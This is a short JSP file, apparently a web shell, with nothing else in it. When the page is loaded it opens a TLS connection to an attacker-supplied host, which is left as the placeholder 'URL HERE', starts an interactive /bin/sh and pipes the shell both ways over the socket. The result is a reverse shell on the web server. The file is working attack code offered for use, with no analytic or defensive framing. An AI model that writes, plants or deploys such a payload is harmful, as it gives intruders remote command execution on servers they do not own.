<%@ page import="java.io.*,javax.net.ssl.*,java.util.concurrent.*" %>
<%

    String host = "URL HERE";
    int port = 443;

    SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
    SSLSocket socket = (SSLSocket) factory.createSocket(host, port);
    socket.setSoTimeout(0);

    InputStream sockIn = socket.getInputStream();
    OutputStream sockOut = socket.getOutputStream();

    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-i");
    pb.redirectErrorStream(true);
    Process process = pb.start();

    InputStream procOut = process.getInputStream();
    OutputStream procIn = process.getOutputStream();

    ExecutorService exec = Executors.newFixedThreadPool(2);

    exec.submit(() -> {
        try {
            byte[] buf = new byte[8192];
            int len;
            while ((len = procOut.read(buf)) != -1) {
                sockOut.write(buf, 0, len);
                sockOut.flush();
            }
        } catch (IOException ignored) {}
    });

    exec.submit(() -> {
        try {
            byte[] buf = new byte[8192];
            int len;
            while ((len = sockIn.read(buf)) != -1) {
                procIn.write(buf, 0, len);
                procIn.flush();
            }
        } catch (IOException ignored) {}
    });

    process.waitFor();

    exec.shutdownNow();
    procIn.close();
    procOut.close();
    sockIn.close();
    sockOut.close();
    socket.close();

    if (process.isAlive()) {
        process.destroyForcibly();
    }
%>
